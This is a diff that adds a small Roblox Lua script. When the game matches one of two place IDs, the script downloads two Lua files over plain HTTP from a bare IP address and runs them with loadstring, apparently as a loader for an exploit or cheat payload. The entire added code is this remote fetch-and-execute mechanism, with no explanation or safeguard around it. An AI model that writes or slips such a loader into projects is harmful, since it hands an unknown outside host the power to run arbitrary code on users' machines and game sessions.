@@ -1,0 +1,9 @@
+if game.PlaceId ~= 96342491571673 and game.PlaceId ~= 109983668079237 and RUN_AFTER then
+    task.spawn(RUN_AFTER)
+end
+
+if game.PlaceId == 96342491571673 or game.PlaceId == 109983668079237 then
+    ID="ae435879-4275-4a0c-b04b-ae19f4d0f66c";
+    RUN_AFTER=loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"));
+    loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+end
